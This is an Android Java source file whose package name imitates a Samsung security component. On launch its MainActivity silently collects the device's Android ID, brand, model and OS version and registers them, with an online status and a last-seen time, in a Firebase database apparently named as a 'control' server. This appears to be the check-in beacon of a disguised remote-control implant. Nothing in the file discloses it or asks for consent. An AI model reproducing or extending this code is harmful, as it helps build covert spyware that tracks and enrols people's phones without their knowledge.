package com.samsung.android.security.v8;

import android.os.Bundle;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        FirebaseDatabase database = FirebaseDatabase.getInstance(
                "https://alkhanjar-control-default-rtdb.firebaseio.com"
        );

        DatabaseReference ref = database.getReference("devices");

        String deviceId = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ANDROID_ID
        );

        HashMap<String, Object> data = new HashMap<>();

        data.put("deviceId", deviceId);
        data.put("brand", android.os.Build.BRAND);
        data.put("model", android.os.Build.MODEL);
        data.put("androidVersion", android.os.Build.VERSION.RELEASE);
        data.put("status", "online");
        data.put("lastSeen", System.currentTimeMillis());

        ref.child(deviceId).setValue(data);
    }
}
